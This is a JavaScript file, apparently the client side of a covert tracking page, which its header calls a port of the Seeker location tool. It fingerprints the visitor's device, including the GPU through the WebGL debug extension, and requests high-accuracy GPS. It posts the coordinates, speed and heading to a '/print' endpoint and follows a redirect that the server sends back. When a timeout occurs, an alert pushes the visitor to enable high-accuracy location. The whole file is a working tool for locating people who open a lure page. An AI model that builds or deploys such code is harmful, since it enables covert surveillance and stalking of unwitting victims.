/**
 * GeoRecon - Serious Geolocation & Device Collector
 * Direct port of Seeker's logic (Vanilla JS, no jQuery)
 */

var ptf, cc, ram, ver, str, os;
var canvas, gl, debugInfo, ven, ren, brw;
var ht, wd;

/**
 * Collect device fingerprint
 */
function information() {
    ptf = navigator.platform;
    cc = navigator.hardwareConcurrency;
    ram = navigator.deviceMemory;
    ver = navigator.userAgent;
    str = ver;
    os = ver;

    // GPU Canvas
    canvas = document.createElement('canvas');

    // Cores
    if (cc === undefined) { cc = 'Not Available'; }

    // RAM
    if (ram === undefined) { ram = 'Not Available'; }

    // Browser Detection
    if (ver.indexOf('Firefox') !== -1) {
        str = str.substring(str.indexOf(' Firefox/') + 1);
        str = str.split(' ');
        brw = str[0];
    } else if (ver.indexOf('Chrome') !== -1) {
        str = str.substring(str.indexOf(' Chrome/') + 1);
        str = str.split(' ');
        brw = str[0];
    } else if (ver.indexOf('Safari') !== -1) {
        str = str.substring(str.indexOf(' Safari/') + 1);
        str = str.split(' ');
        brw = str[0];
    } else if (ver.indexOf('Edge') !== -1) {
        str = str.substring(str.indexOf(' Edge/') + 1);
        str = str.split(' ');
        brw = str[0];
    } else {
        brw = 'Not Available';
    }

    // GPU Detection
    try {
        gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    } catch (e) { gl = null; }

    if (gl) {
        debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
            ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
            ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        }
    }
    if (ven === undefined) { ven = 'Not Available'; }
    if (ren === undefined) { ren = 'Not Available'; }

    // Screen
    ht = window.screen.height;
    wd = window.screen.width;

    // OS Parsing
    os = os.substring(0, os.indexOf(')'));
    os = os.split(';');
    os = os[1];
    if (os === undefined) { os = 'Not Available'; }
    os = os.trim();

    // Send Device Info to Server
    fetch('/print', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            type: 'device_info',
            Platform: ptf,
            Browser: brw,
            Cores: cc,
            RAM: ram,
            Vendor: ven,
            Renderer: ren,
            Height: ht,
            Width: wd,
            OS: os
        })
    }).catch(err => console.error('Info send error:', err));
}

/**
 * Main Geolocation Function
 */
function locate(callback, errCallback) {
    if (!navigator.geolocation) {
        errCallback({code: 0}, 'Geolocation not supported');
        return;
    }

    var optn = { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 };

    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);

    function showError(error) {
        var err_text;
        var err_status = 'failed';

        switch (error.code) {
            case error.PERMISSION_DENIED:
                err_text = 'User denied the request for Geolocation';
                break;
            case error.POSITION_UNAVAILABLE:
                err_text = 'Location information is unavailable';
                break;
            case error.TIMEOUT:
                err_text = 'The request to get user location timed out';
                alert('Please set your location mode on high accuracy...');
                break;
            case error.UNKNOWN_ERROR:
                err_text = 'An unknown error occurred';
                break;
            default:
                err_text = 'Unknown error';
        }

        // Send Error to Server
        fetch('/print', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                type: 'error',
                Status: err_status,
                Error: err_text
            })
        }).catch(e => console.error('Error send failed:', e));

        errCallback(error, err_text);
    }

    function showPosition(position) {
        var lat = position.coords.latitude;
        lat = lat ? lat + ' deg' : 'Not Available';

        var lon = position.coords.longitude;
        lon = lon ? lon + ' deg' : 'Not Available';

        var acc = position.coords.accuracy;
        acc = acc ? acc + ' m' : 'Not Available';

        var alt = position.coords.altitude;
        alt = alt ? alt + ' m' : 'Not Available';

        var dir = position.coords.heading;
        dir = dir ? dir + ' deg' : 'Not Available';

        var spd = position.coords.speed;
        spd = spd ? spd + ' m/s' : 'Not Available';

        var ok_status = 'success';

        // Send Location to Server
        fetch('/print', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                type: 'location',
                Status: ok_status,
                Latitude: lat,
                Longitude: lon,
                Accuracy: acc,
                Altitude: alt,
                Direction: dir,
                Speed: spd
            })
        })
        .then(res => res.json())
        .then(data => {
            if (data.redirect) {
                window.location.href = data.redirect;
            }
        })
        .catch(err => console.error('Location send error:', err));

        callback();
    }
}